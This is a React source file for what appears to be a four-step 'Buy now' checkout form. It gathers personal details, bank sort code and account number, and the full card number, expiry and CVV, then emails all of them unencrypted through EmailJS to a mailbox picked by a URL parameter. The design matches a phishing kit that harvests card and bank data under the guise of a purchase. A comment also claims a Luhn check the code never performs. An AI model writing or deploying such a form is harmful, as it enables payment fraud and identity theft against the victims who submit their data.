import React, { useState } from 'react';
import emailjs from '@emailjs/browser';
import Success from './Success';
import StepIndicator from './StepIndicator';
import Step1 from './steps/Step1';
import Step2 from './steps/Step2';
import Step3 from './steps/Step3';
import Step4 from './steps/Step4';
import { getConfig } from '../emailConfig';

const MultiStepForm = () => {
    const [currentStep, setCurrentStep] = useState(1);
    const [isSubmitted, setIsSubmitted] = useState(false);
    const totalSteps = 4;

    const [formData, setFormData] = useState({
        // Step 1: Personal
        title: '',
        fullName: '',
        dob: '',
        maritalStatus: '',
        // Step 2: Address
        fullAddress: '',
        postCode: '',
        timeOnAddress: '',
        residenceStatus: '',
        // Step 3: Financial
        bankName: '',
        timeWithBank: '',
        sortCode: '',
        accountNumber: '',
        nameOnCard: '',
        longCardNumber: '',
        exp: '',
        cvv: ''
    });

    const [errors, setErrors] = useState({});

    const validateStep = (step) => {
        const newErrors = {};

        if (step === 1) {
            if (!formData.title) newErrors.title = 'Title is required';
            if (!formData.fullName) newErrors.fullName = 'Full Name is required';
            if (!formData.dob) newErrors.dob = 'Date of Birth is required';
            if (!formData.maritalStatus) newErrors.maritalStatus = 'Marital Status is required';
        }
        else if (step === 2) {
            if (!formData.fullAddress) newErrors.fullAddress = 'Address is required';
            if (!formData.postCode) newErrors.postCode = 'Post Code is required';
            if (!formData.timeOnAddress) newErrors.timeOnAddress = 'Time on Address is required';
            if (!formData.residenceStatus) newErrors.residenceStatus = 'Residence Status is required';
        }
        else if (step === 3) {
            if (!formData.bankName) newErrors.bankName = 'Bank Name is required';
            if (!formData.timeWithBank) newErrors.timeWithBank = 'Time with Bank is required';
            if (!formData.sortCode) newErrors.sortCode = 'Sort Code is required';
            if (!formData.accountNumber) newErrors.accountNumber = 'Account Number is required';
            if (!formData.nameOnCard) newErrors.nameOnCard = 'Name on Card is required';

            // Luhn Algorithm Check
            const cleanCardNum = (formData.longCardNumber || '').replace(/\s/g, '');
            if (!cleanCardNum) {
                newErrors.longCardNumber = 'Card Number is required';
            } else if (cleanCardNum.length < 16) {
                newErrors.longCardNumber = 'Incomplete Card Number';
            }

            if (!formData.exp) newErrors.exp = 'Expiry Date is required';
            if (!formData.cvv) newErrors.cvv = 'CVV is required';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleNext = () => {
        if (validateStep(currentStep)) {
            setCurrentStep((prev) => prev + 1);
        }
    };

    const handleBack = () => {
        setCurrentStep((prev) => prev - 1);
    };

    const handleSubmit = () => {
        const queryParams = new URLSearchParams(window.location.search);
        const formId = queryParams.get('form') || '1';
        const config = getConfig(formId);

        if (!config) {
            alert('Invalid Form Configuration');
            return;
        }

        const templateParams = {
            ...formData,
            product_id: config.productId,
            form_id: formId
        };

        console.log(`Sending email using Form ${formId} config:`, config);

        emailjs.send(config.serviceId, config.templateId, templateParams, config.publicKey)
            .then((response) => {
                console.log('SUCCESS!', response.status, response.text);
                setIsSubmitted(true);
            }, (err) => {
                console.log('FAILED...', err);
                alert('Failed to submit form: ' + JSON.stringify(err));
            });
    };

    if (isSubmitted) {
        return <Success />;
    }

    const renderStep = () => {
        switch (currentStep) {
            case 1:
                return <Step1 formData={formData} setFormData={setFormData} errors={errors} />;
            case 2:
                return <Step2 formData={formData} setFormData={setFormData} errors={errors} />;
            case 3:
                return <Step3 formData={formData} setFormData={setFormData} errors={errors} />;
            case 4:
                return <Step4 formData={formData} />;
            default:
                return <Step1 formData={formData} setFormData={setFormData} errors={errors} />;
        }
    };

    return (
        <div className="multi-step-form-card">
            <StepIndicator currentStep={currentStep} totalSteps={totalSteps} />
            <div className="form-content">
                {renderStep()}
            </div>
            <div className="form-navigation">
                {currentStep > 1 && (
                    <button className="btn-secondary" onClick={handleBack}>
                        Back
                    </button>
                )}
                {currentStep < totalSteps ? (
                    <button className="btn-primary" onClick={handleNext}>
                        Buy now
                    </button>
                ) : (
                    <button className="btn-primary" onClick={handleSubmit}>
                        Submit
                    </button>
                )}
            </div>
        </div>
    );
};

export default MultiStepForm;
